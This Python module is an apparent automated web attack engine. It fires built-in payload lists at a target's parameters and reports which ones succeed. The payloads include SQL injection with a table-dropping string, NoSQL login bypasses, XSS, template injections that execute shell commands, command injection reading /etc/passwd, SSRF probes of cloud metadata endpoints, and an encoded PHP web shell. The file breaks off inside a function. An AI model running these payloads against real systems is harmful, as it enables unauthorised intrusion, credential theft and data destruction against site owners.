#!/usr/bin/env python3
"""
Agent DS - Web Attack Engine
Comprehensive web application vulnerability testing with AI-enhanced payloads

This module handles advanced web application attacks including:
- SQL Injection (SQLi, Blind SQLi, NoSQLi)
- Cross-Site Scripting (XSS - Reflected, Stored, DOM)
- Server-Side Request Forgery (SSRF)
- Server-Side Template Injection (SSTI)
- Insecure Direct Object References (IDOR)
- HTTP Parameter Pollution (HPP)
- Cross-Site Request Forgery (CSRF)
- CORS Misconfigurations
- Command Injection
- File Inclusion (LFI/RFI)

Author: Agent DS Team
Version: 2.0
Date: September 16, 2025
"""

import asyncio
import json
import re
import random
import string
import hashlib
import base64
from typing import Dict, List, Set, Optional, Any, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import time
import concurrent.futures
from bs4 import BeautifulSoup
import xml.etree.ElementTree as ET

# Disable SSL warnings for testing
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class WebAttackEngine:
    """
    Advanced web application attack engine with AI-enhanced vulnerability testing
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False  # For testing purposes
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # SQL Injection payloads
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR ('1'='1",
            "') OR (1=1)--",
            "1' OR '1'='1",
            "1 OR 1=1",
            "1' UNION SELECT 1,2,3--",
            "1' UNION ALL SELECT NULL,NULL,NULL--",
            "'; DROP TABLE users; --",
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' OR IF(1=1,SLEEP(5),0)--"
        ]
        
        # NoSQL Injection payloads
        self.nosql_payloads = [
            {"$ne": ""},
            {"$ne": None},
            {"$gt": ""},
            {"$exists": True},
            {"$regex": ".*"},
            {"$where": "1==1"},
            {"$or": [{"username": {"$ne": ""}}, {"username": {"$exists": True}}]},
            {"$and": [{"username": {"$ne": ""}}, {"password": {"$ne": ""}}]},
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"$where": "this.username == this.password"},
            {"$where": "Object.keys(this)[0].match('^.{8}')"}
        ]
        
        # XSS payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "javascript:alert('XSS')",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            "'\"><script>alert('XSS')</script>",
            "\"/><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script src=data:text/javascript,alert('XSS')></script>",
            "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>"
        ]
        
        # SSTI payloads for different template engines
        self.ssti_payloads = {
            'jinja2': [
                "{{7*7}}",
                "{{config}}",
                "{{config.items()}}",
                "{{request}}",
                "{{request.environ}}",
                "{{request.environ['OS']}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{{url_for.__globals__['sys'].modules}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
            ],
            'smarty': [
                "{php}echo 7*7;{/php}",
                "{php}system('id');{/php}",
                "{php}phpinfo();{/php}",
                "{$smarty.version}",
                "{php}echo file_get_contents('/etc/passwd');{/php}"
            ],
            'freemarker': [
                "${7*7}",
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}",
                "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
                "<#assign classloader=article.class.protectionDomain.classLoader>",
                "<#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")>"
            ],
            'velocity': [
                "#set($str=$class.inspect(\"java.lang.String\").type)",
                "#set($chr=$class.inspect(\"java.lang.Character\").type)",
                "#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\"))",
                "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"whoami\")"
            ],
            'twig': [
                "{{7*7}}",
                "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
                "{{_self.env.enableDebug()}}{{_self.env.isDebug()}}",
                "{{dump(app)}}",
                "{{attribute(_context,request)}}",
                "{{_context|keys}}"
            ]
        }
        
        # SSRF payloads
        self.ssrf_payloads = [
            "http://localhost/",
            "http://127.0.0.1/",
            "http://0.0.0.0/",
            "http://[::1]/",
            "http://localhost:80/",
            "http://localhost:22/",
            "http://localhost:443/",
            "http://localhost:3306/",
            "http://localhost:5432/",
            "http://localhost:6379/",
            "http://169.254.169.254/",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://metadata.google.internal/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/",
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///proc/version",
            "file:///proc/self/environ",
            "gopher://127.0.0.1:80/",
            "dict://127.0.0.1:11211/",
            "ftp://127.0.0.1/"
        ]
        
        # Command injection payloads
        self.command_injection_payloads = [
            "; id",
            "| id",
            "& id",
            "&& id",
            "|| id",
            "`id`",
            "$(id)",
            "; whoami",
            "| whoami",
            "& whoami",
            "&& whoami",
            "|| whoami",
            "`whoami`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; ls -la",
            "| ls -la",
            "; ping -c 4 127.0.0.1",
            "| ping -c 4 127.0.0.1",
            "%0A id",
            "%0A whoami",
            "%0A cat /etc/passwd"
        ]
        
        # LFI/RFI payloads
        self.lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "/proc/version",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
            "/var/log/apache/access.log",
            "/etc/httpd/logs/access_log",
            "/var/log/nginx/access.log",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=string.rot13/resource=index.php",
            "expect://id",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            "zip://test.jpg%23shell.php",
            "phar://test.zip/shell.php"
        ]
        
        # CORS test origins
        self.cors_origins = [
            "https://evil.com",
            "http://evil.com",
            "null",
            "*",
            "https://subdomain.target.com",
            "https://target.com.evil.com"
        ]
    
    async def test_sql_injection(self, target_url: str) -> Dict[str, Any]:
        """
        Comprehensive SQL injection testing
        """
        results = {
            'vulnerable': False,
            'vulnerabilities': [],
            'payloads_tested': 0,
            'response_times': [],
            'error_patterns': [],
            'blind_sqli': False,
            'time_based': False
        }
        
        # Parse URL and extract parameters
        test_urls = await self._extract_test_points(target_url)
        
        for url_data in test_urls:
            url = url_data['url']
            method = url_data['method']
            params = url_data['params']
            
            # Test each parameter
            for param_name in params.keys():
                # Test classic SQL injection
                classic_results = await self._test_classic_sqli(url, method, params, param_name)
                if classic_results['vulnerable']:
                    results['vulnerable'] = True
                    results['vulnerabilities'].extend(classic_results['vulnerabilities'])
                
                # Test blind SQL injection
                blind_results = await self._test_blind_sqli(url, method, params, param_name)
                if blind_results['vulnerable']:
                    results['vulnerable'] = True
                    results['blind_sqli'] = True
                    results['vulnerabilities'].extend(blind_results['vulnerabilities'])
                
                # Test time-based SQL injection
                time_results = await self._test_time_based_sqli(url, method, params, param_name)
                if time_results['vulnerable']:
                    results['vulnerable'] = True
                    results['time_based'] = True
                    results['vulnerabilities'].extend(time_results['vulnerabilities'])
                
                # Test NoSQL injection
                nosql_results = await self._test_nosql_injection(url, method, params, param_name)
                if nosql_results['vulnerable']:
                    results['vulnerable'] = True
                    results['vulnerabilities'].extend(nosql_results['vulnerabilities'])
                
                results['payloads_tested'] += (
                    classic_results.get('payloads_tested', 0) +
                    blind_results.get('payloads_tested', 0) +
                    time_results.get('payloads_tested', 0) +
                    nosql_results.get('payloads_tested', 0)
                )
        
        return results
    
    async def _test_classic_sqli(self, url: str, method: str, params: Dict, param_name: str) -> Dict[str, Any]:
        """Test classic SQL injection"""
        results = {
            'vulnerable': False,
            'vulnerabilities': [],
            'payloads_tested': 0
        }
        
        original_value = params[param_name]
        
        for payload in self.sqli_payloads[:10]:  # Test first 10 payloads
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                start_time = time.time()
                
                if method.upper() == 'GET':
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.get(url, params=test_params, timeout=10)
                    )
                else:
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.post(url, data=test_params, timeout=10)
                    )
                
                response_time = time.time() - start_time
                
                # Check for SQL error patterns
                error_patterns = [
                    r"mysql_fetch_array\(\)",
                    r"ORA-\d{5}",
                    r"Microsoft.*ODBC.*SQL Server",
                    r"PostgreSQL.*ERROR",
                    r"Warning.*mysql_.*",
                    r"valid MySQL result",
                    r"MySqlClient\.",
                    r"PostgreSQL query failed",
                    r"OLE DB.*SQL Server",
                    r"(\[SQL Server\])",
                    r"(\[Microsoft\]\[ODBC SQL Server Driver\])",
                    r"(\[SQLServer JDBC Driver\])",
                    r"(\[SqlException",
                    r"System\.Data\.SqlClient\.SqlException",
                    r"Unclosed quotation mark after the character string",
                    r"'80040e14'",
                    r"mssql_query\(\)",
                    r"odbc_exec\(\)",
                    r"Microsoft Access Driver",
                    r"JET Database Engine",
                    r"Access Database Engine",
                    r"SQLite/JDBCDriver",
                    r"SQLite.Exception",
                    r"System.Data.SQLite.SQLiteException",
                    r"Warning.*\Wpg_.*",
                    r"valid PostgreSQL result",
                    r"Npgsql\.",
                    r"PG::SyntaxError:",
                    r"org\.postgresql\.util\.PSQLException",
                    r"ERROR:\s\ssyntax error at or near",
                    r"ERROR: parser: parse error at or near",
                    r"PostgreSQL query failed: ERROR: parser: parse error",
                    r"syntax error at or near"
                ]
                
                response_text = response.text.lower()
                
                for pattern in error_patterns:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        results['vulnerable'] = True
                        results['vulnerabilities'].append({
                            'type': 'SQL Injection',
                            'parameter': param_name,
                            'payload': payload,
                            'url': url,
                            'method': method,
                            'error_pattern': pattern,
                            'confidence': 'High',
                            'response_time': response_time
                        })
                        break
                
                results['payloads_tested'] += 1
                
            except Exception as e:
                continue
        
        return results
    
    async def _test_blind_sqli(self, url: str, method: str, params: Dict, param_name: str) -> Dict[str, Any]:
        """Test blind SQL injection"""
        results = {
            'vulnerable': False,
            'vulnerabilities': [],
            'payloads_tested': 0
        }
        
        # Get baseline response
        try:
            if method.upper() == 'GET':
                baseline_response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: self.session.get(url, params=params, timeout=10)
                )
            else:
                baseline_response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: self.session.post(url, data=params, timeout=10)
                )
            
            baseline_length = len(baseline_response.text)
            baseline_status = baseline_response.status_code
            
        except Exception:
            return results
        
        # Test boolean-based blind SQL injection
        true_payloads = [
            "' AND '1'='1",
            "' AND 1=1--",
            "' AND 'a'='a",
            "1 AND 1=1",
            "1' AND '1'='1'--"
        ]
        
        false_payloads = [
            "' AND '1'='2",
            "' AND 1=2--",
            "' AND 'a'='b",
            "1 AND 1=2",
            "1' AND '1'='2'--"
        ]
        
        # Test true conditions
        true_responses = []
        for payload in true_payloads[:3]:
            test_params = params.copy()
            test_params[param_name] = params[param_name] + payload
            
            try:
                if method.upper() == 'GET':
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.get(url, params=test_params, timeout=10)
                    )
                else:
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.post(url, data=test_params, timeout=10)
                    )
                
                true_responses.append({
                    'length': len(response.text),
                    'status': response.status_code,
                    'payload': payload
                })
                
                results['payloads_tested'] += 1
                
            except Exception:
                continue
        
        # Test false conditions
        false_responses = []
        for payload in false_payloads[:3]:
            test_params = params.copy()
            test_params[param_name] = params[param_name] + payload
            
            try:
                if method.upper() == 'GET':
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.get(url, params=test_params, timeout=10)
                    )
                else:
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.post(url, data=test_params, timeout=10)
                    )
                
                false_responses.append({
                    'length': len(response.text),
                    'status': response.status_code,
                    'payload': payload
                })
                
                results['payloads_tested'] += 1
                
            except Exception:
                continue
        
        # Analyze responses for consistent differences
        if true_responses and false_responses:
            true_lengths = [r['length'] for r in true_responses]
            false_lengths = [r['length'] for r in false_responses]
            
            # Check if true conditions consistently return different response lengths
            if (len(set(true_lengths)) <= 2 and 
                len(set(false_lengths)) <= 2 and 
                abs(sum(true_lengths)/len(true_lengths) - sum(false_lengths)/len(false_lengths)) > 10):
                
                results['vulnerable'] = True
                results['vulnerabilities'].append({
                    'type': 'Blind SQL Injection',
                    'parameter': param_name,
                    'url': url,
                    'method': method,
                    'true_payloads': [r['payload'] for r in true_responses],
                    'false_payloads': [r['payload'] for r in false_responses],
                    'confidence': 'Medium',
                    'evidence': f"True conditions avg length: {sum(true_lengths)/len(true_lengths)}, False conditions avg length: {sum(false_lengths)/len(false_lengths)}"
                })
        
        return results
    
    async def _test_time_based_sqli(self, url: str, method: str, params: Dict, param_name: str) -> Dict[str, Any]:
        """Test time-based SQL injection"""
        results = {
            'vulnerable': False,
            'vulnerabilities': [],
            'payloads_tested': 0
        }
        
        time_payloads = [
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND IF(1=1,SLEEP(5),0)--",
            "'; SELECT pg_sleep(5)--",
            "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)||CHR(111)||CHR(119),5)--"
        ]
        
        # Get baseline response time
        baseline_times = []
        for _ in range(3):
            try:
                start_time = time.time()
                
                if method.upper() == 'GET':
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.get(url, params=params, timeout=15)
                    )
                else:
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.post(url, data=params, timeout=15)
                    )
                
                baseline_times.append(time.time() - start_time)
                
            except Exception:
                continue
        
        if not baseline_times:
            return results
        
        baseline_avg = sum(baseline_times) / len(baseline_times)
        
        # Test time-based payloads
        for payload in time_payloads:
            test_params = params.copy()
            test_params[param_name] = params[param_name] + payload
            
            try:
                start_time = time.time()
                
                if method.upper() == 'GET':
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.get(url, params=test_params, timeout=15)
                    )
                else:
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.post(url, data=test_params, timeout=15)
                    )
                
                response_time = time.time() - start_time
                
                # Check if response time indicates sleep was executed
                if response_time > baseline_avg + 4:  # At least 4 seconds delay
                    results['vulnerable'] = True
                    results['vulnerabilities'].append({
                        'type': 'Time-based SQL Injection',
                        'parameter': param_name,
                        'payload': payload,
                        'url': url,
                        'method': method,
                        'baseline_time': baseline_avg,
                        'response_time': response_time,
                        'confidence': 'High'
                    })
                
                results['payloads_tested'] += 1
                
            except Exception:
                continue
        
        return results
    
    async def _test_nosql_injection(self, url: str, method: str, params: Dict, param_name: str) -> Dict[str, Any]:
        """Test NoSQL injection"""
        results = {
            'vulnerable': False,
            'vulnerabilities': [],
            'payloads_tested': 0
        }
        
        # Get baseline response
        try:
            if method.upper() == 'GET':
                baseline_response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: self.session.get(url, params=params, timeout=10)
                )
            else:
                baseline_response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: self.session.post(url, data=params, timeout=10)
                )
            
            baseline_length = len(baseline_response.text)
            
        except Exception:
            return results
        
        # Test NoSQL payloads
        for payload in self.nosql_payloads:
            test_params = params.copy()
            
            # Try different injection methods
            injection_methods = [
                json.dumps(payload),  # JSON payload
                str(payload),         # String representation
                f"[$ne]="            # URL parameter format
            ]
            
            for injection in injection_methods:
                test_params[param_name] = injection
                
                try:
                    if method.upper() == 'GET':
                        response = await asyncio.get_event_loop().run_in_executor(
                            None,
                            lambda: self.session.get(url, params=test_params, timeout=10)
                        )
                    else:
                        # For POST, try both form data and JSON
                        if 'json.dumps' in str(injection):
                            response = await asyncio.get_event_loop().run_in_executor(
                                None,
                                lambda: self.session.post(url, json={param_name: payload}, timeout=10)
                            )
                        else:
                            response = await asyncio.get_event_loop().run_in_executor(
                                None,
                                lambda: self.session.post(url, data=test_params, timeout=10)
                            )
                    
                    # Check for authentication bypass or different response
                    response_text = response.text.lower()
                    
                    # Look for successful authentication indicators
                    success_indicators = [
                        'welcome', 'dashboard', 'profile', 'logout', 'admin',
                        'success', 'authenticated', 'authorized', 'logged in'
                    ]
                    
                    # Look for database error patterns
                    error_patterns = [
                        'mongodb', 'nosql', 'couchdb', 'redis', 'dynamodb',
                        'documentdb', 'cosmosdb', 'firebase', 'mongoose'
                    ]
                    
                    for indicator in success_indicators:
                        if indicator in response_text and indicator not in baseline_response.text.lower():
                            results['vulnerable'] = True
                            results['vulnerabilities'].append({
                                'type': 'NoSQL Injection - Authentication Bypass',
                                'parameter': param_name,
                                'payload': str(payload),
                                'url': url,
                                'method': method,
                                'evidence': f"Response contains '{indicator}' not in baseline",
                                'confidence': 'Medium'
                            })
                            break
                    
                    for pattern in error_patterns:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            results['vulnerable'] = True
                            results['vulnerabilities'].append({
                                'type': 'NoSQL Injection - Error-based',
                                'parameter': param_name,
                                'payload': str(payload),
                                'url': url,
                                'method': method,
                                'error_pattern': pattern,
                                'confidence': 'High'
                            })
                            break
                    
                    results['payloads_tested'] += 1
                    
                except Exception:
                    continue
        
        return results
    
    async def test_xss(self, target_url: str) -> Dict[str, Any]:
        """
        Comprehensive XSS testing (Reflected, Stored, DOM)
        """
        results = {
            'vulnerable': False,
            'vulnerabilities': [],
            'payloads_tested': 0,
            'reflected_xss': False,
            'stored_xss': False,
            'dom_xss': False
        }
        
        # Parse URL and extract test points
        test_urls = await self._extract_test_points(target_url)
        
        for url_data in test_urls:
            url = url_data['url']
            method = url_data['method']
            params = url_data['params']
            
            # Test each parameter for XSS
            for param_name in params.keys():
                # Test reflected XSS
                reflected_results = await self._test_reflected_xss(url, method, params, param_name)
                if reflected_results['vulnerable']:
                    results['vulnerable'] = True
                    results['reflected_xss'] = True
                    results['vulnerabilities'].extend(reflected_results['vulnerabilities'])
                
                # Test stored XSS
                stored_results = await self._test_stored_xss(url, method, params, param_name)
                if stored_results['vulnerable']:
                    results['vulnerable'] = True
                    results['stored_xss'] = True
                    results['vulnerabilities'].extend(stored_results['vulnerabilities'])
                
                results['payloads_tested'] += (
                    reflected_results.get('payloads_tested', 0) +
                    stored_results.get('payloads_tested', 0)
                )
        
        # Test DOM XSS
        dom_results = await self._test_dom_xss(target_url)
        if dom_results['vulnerable']:
            results['vulnerable'] = True
            results['dom_xss'] = True
            results['vulnerabilities'].extend(dom_results['vulnerabilities'])
            results['payloads_tested'] += dom_results.get('payloads_tested', 0)
        
        return results
    
    async def _test_reflected_xss(self, url: str, method: str, params: Dict, param_name: str) -> Dict[str, Any]:
        """Test reflected XSS"""
        results = {
            'vulnerable': False,
            'vulnerabilities': [],
            'payloads_tested': 0
        }
        
        # Generate unique payload identifier
        unique_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
        for base_payload in self.xss_payloads[:15]:  # Test first 15 payloads
            # Create unique payload
            payload = base_payload.replace('XSS', f'XSS{unique_id}')
            
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                if method.upper() == 'GET':
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.get(url, params=test_params, timeout=10)
                    )
                else:
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.post(url, data=test_params, timeout=10)
                    )
                
                # Check if payload is reflected in response
                if unique_id in response.text:
                    # Check if it's executed (unescaped)
                    if payload in response.text or base_payload.replace('XSS', f'XSS{unique_id}') in response.text:
                        results['vulnerable'] = True
                        results['vulnerabilities'].append({
                            'type': 'Reflected XSS',
                            'parameter': param_name,
                            'payload': payload,
                            'url': url,
                            'method': method,
                            'confidence': 'High' if '<script>' in response.text else 'Medium',
                            'context': 'HTML' if '<' in response.text else 'Attribute'
                        })
                
                results['payloads_tested'] += 1
                
            except Exception:
                continue
        
        return results
    
    async def _test_stored_xss(self, url: str, method: str, params: Dict, param_name: str) -> Dict[str, Any]:
        """Test stored XSS"""
        results = {
            'vulnerable': False,
            'vulnerabilities': [],
            'payloads_tested': 0
        }
        
        # Generate unique payload identifier
        unique_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
        # Submit XSS payload
        for base_payload in self.xss_payloads[:10]:  # Test first 10 payloads
            payload = base_payload.replace('XSS', f'STORED{unique_id}')
            
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                # Submit the payload
                if method.upper() == 'GET':
                    submit_response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.get(url, params=test_params, timeout=10)
                    )
                else:
                    submit_response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.post(url, data=test_params, timeout=10)
                    )
                
                # Wait a moment for processing
                await asyncio.sleep(1)
                
                # Check if payload is stored by requesting the page again
                check_response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: self.session.get(url, timeout=10)
                )
                
                # Look for the stored payload
                if f'STORED{unique_id}' in check_response.text:
                    if payload in check_response.text:
                        results['vulnerable'] = True
                        results['vulnerabilities'].append({
                            'type': 'Stored XSS',
                            'parameter': param_name,
                            'payload': payload,
                            'url': url,
                            'method': method,
                            'confidence': 'High',
                            'persistence': 'Confirmed'
                        })
                
                results['payloads_tested'] += 1
                
            except Exception:
                continue
        
        return results
    
    async def _test_dom_xss(self, url: str) -> Dict[str, Any]:
        """Test DOM XSS"""
        results = {
            'vulnerable': False,
            'vulnerabilities': [],
            'payloads_tested': 0
        }
        
        # DOM XSS usually involves URL fragments or client-side parameters
        dom_payloads = [
            "#<script>alert('DOMXSS')</script>",
            "#<img src=x onerror=alert('DOMXSS')>",
            "#javascript:alert('DOMXSS')",
            "?callback=alert('DOMXSS')",
            "?jsonp=alert('DOMXSS')"
        ]
        
        for payload in dom_payloads:
            test_url = url + payload
            
            try:
                response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: self.session.get(test_url, timeout=10)
                )
                
                # Look for DOM XSS indicators in JavaScript
                if 'DOMXSS' in response.text:
                    # Check for vulnerable DOM manipulation patterns
                    dom_patterns = [
                        r'document\.write\(',
                        r'innerHTML\s*=',
                        r'outerHTML\s*=',
                        r'document\.location',
                        r'window\.location',
                        r'eval\(',
                        r'setTimeout\(',
                        r'setInterval\('
                    ]
                    
                    for pattern in dom_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            results['vulnerable'] = True
                            results['vulnerabilities'].append({
                                'type': 'DOM XSS',
                                'payload': payload,
                                'url': test_url,
                                'method': 'GET',
                                'confidence': 'Medium',
                                'dom_pattern': pattern
                            })
                            break
                
                results['payloads_tested'] += 1
                
            except Exception:
                continue
        
        return results
    
    async def test_ssrf(self, target_url: str) -> Dict[str, Any]:
        """
        Test for Server-Side Request Forgery (SSRF)
        """
        results = {
            'vulnerable': False,
            'vulnerabilities': [],
            'payloads_tested': 0,
            'internal_access': False,
            'cloud_metadata': False,
            'file_access': False
        }
        
        # Extract test points
        test_urls = await self._extract_test_points(target_url)
        
        for url_data in test_urls:
            url = url_data['url']
            method = url_data['method']
            params = url_data['params']
            
            # Test each parameter for SSRF
            for param_name in params.keys():
                ssrf_results = await self._test_ssrf_parameter(url, method, params, param_name)
                if ssrf_results['vulnerable']:
                    results['vulnerable'] = True
                    results['vulnerabilities'].extend(ssrf_results['vulnerabilities'])
                    
                    # Update specific SSRF types
                    for vuln in ssrf_results['vulnerabilities']:
                        if 'localhost' in vuln.get('payload', '') or '127.0.0.1' in vuln.get('payload', ''):
                            results['internal_access'] = True
                        if 'metadata' in vuln.get('payload', ''):
                            results['cloud_metadata'] = True
                        if 'file://' in vuln.get('payload', ''):
                            results['file_access'] = True
                
                results['payloads_tested'] += ssrf_results.get('payloads_tested', 0)
        
        return results
    
    async def _test_ssrf_parameter(self, url: str, method: str, params: Dict, param_name: str) -> Dict[str, Any]:
        """Test SSRF on a specific parameter"""
        results = {
            'vulnerable': False,
            'vulnerabilities': [],
            'payloads_tested': 0
        }
        
        # Test different SSRF payloads
        for payload in self.ssrf_payloads:
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                start_time = time.time()
                
                if method.upper() == 'GET':
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.get(url, params=test_params, timeout=15)
                    )
                else:
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.post(url, data=test_params, timeout=15)
                    )
                
                response_time = time.time() - start_time
                response_text = response.text.lower()
                
                # Check for SSRF indicators
                ssrf_indicators = [
                    # AWS metadata
                    'ami-id', 'instance-id', 'local-hostname', 'local-ipv4',
                    'placement', 'security-groups', 'iam/security-credentials',
                    # Google Cloud metadata
                    'computemetadata', 'metadata-flavor',
                    # Azure metadata
                    'azureservices', 'metadata.azure',
                    # File access indicators
                    'root:x:0:0:', '/bin/bash', '/bin/sh', 'daemon:x:', 'nobody:x:',
                    # Internal service responses
                    'apache', 'nginx', 'iis', 'server:', 'powered by',
                    # Database connection errors
                    'connection refused', 'connection timeout', 'no route to host',
                    # Redis/Memcached
                    'redis_version', 'memcached', 'stats pid',
                    # SSH/FTP banners
                    'openssh', 'ssh-', 'ftp server', '220 '
                ]
                
                for indicator in ssrf_indicators:
                    if indicator in response_text:
                        confidence = 'High' if indicator in ['ami-id', 'root:x:0:0:', 'redis_version'] else 'Medium'
                        
                        results['vulnerable'] = True
                        results['vulnerabilities'].append({
                            'type': 'Server-Side Request Forgery (SSRF)',
                            'parameter': param_name,
                            'payload': payload,
                            'url': url,
                            'method': method,
                            'indicator': indicator,
                            'confidence': confidence,
                            'response_time': response_time
                        })
                        break
                
                # Check for timeout indicators (internal network access)
                if response_time > 10 and ('localhost' in payload or '127.0.0.1' in payload):
                    results['vulnerable'] = True
                    results['vulnerabilities'].append({
                        'type': 'SSRF - Internal Network Access',
                        'parameter': param_name,
                        'payload': payload,
                        'url': url,
                        'method': method,
                        'evidence': f'Response time: {response_time}s (timeout indicator)',
                        'confidence': 'Low'
                    })
                
                results['payloads_tested'] += 1
                
            except Exception as e:
                # Timeout might indicate SSRF
                if 'timeout' in str(e).lower():
                    results['vulnerable'] = True
                    results['vulnerabilities'].append({
                        'type': 'SSRF - Timeout Indicator',
                        'parameter': param_name,
                        'payload': payload,
                        'url': url,
                        'method': method,
                        'evidence': f'Request timeout: {str(e)}',
                        'confidence': 'Low'
                    })
                    results['payloads_tested'] += 1
                continue
        
        return results
    
    async def test_ssti(self, target_url: str) -> Dict[str, Any]:
        """
        Test for Server-Side Template Injection (SSTI)
        """
        results = {
            'vulnerable': False,
            'vulnerabilities': [],
            'payloads_tested': 0,
            'template_engines': []
        }
        
        # Extract test points
        test_urls = await self._extract_test_points(target_url)
        
        for url_data in test_urls:
            url = url_data['url']
            method = url_data['method']
            params = url_data['params']
            
            # Test each parameter for SSTI
            for param_name in params.keys():
                for engine, payloads in self.ssti_payloads.items():
                    ssti_results = await self._test_ssti_engine(url, method, params, param_name, engine, payloads)
                    if ssti_results['vulnerable']:
                        results['vulnerable'] = True
                        results['vulnerabilities'].extend(ssti_results['vulnerabilities'])
                        if engine not in results['template_engines']:
                            results['template_engines'].append(engine)
                    
                    results['payloads_tested'] += ssti_results.get('payloads_tested', 0)
        
        return results
    
    async def _test_ssti_engine(self, url: str, method: str, params: Dict, param_name: str, engine: str, payloads: List[str]) -> Dict[str, Any]:
        """Test SSTI for a specific template engine"""
        results = {
            'vulnerable': False,
            'vulnerabilities': [],
            'payloads_tested': 0
        }
        
        for payload in payloads[:5]:  # Test first 5 payloads per engine
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                if method.upper() == 'GET':
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.get(url, params=test_params, timeout=10)
                    )
                else:
                    response = await asyncio.get_event_loop().run_in_executor(
                        None,
                        lambda: self.session.post(url, data=test_params, timeout=10)
                    )
                
                response_text = response.text
                
                # Check for SSTI indicators
                ssti_indicators = {
                    'jinja2': ['49', 'config', 'request', 'builtins'],
                    'smarty': ['49', 'phpinfo', 'system'],
                    'freemarker': ['49', 'freemarker', 'Execute'],
                    'velocity': ['Runtime', 'getRuntime'],
                    'twig': ['49', 'dump', '_context']
                }
                
                # Check for mathematical evaluation (7*7=49)
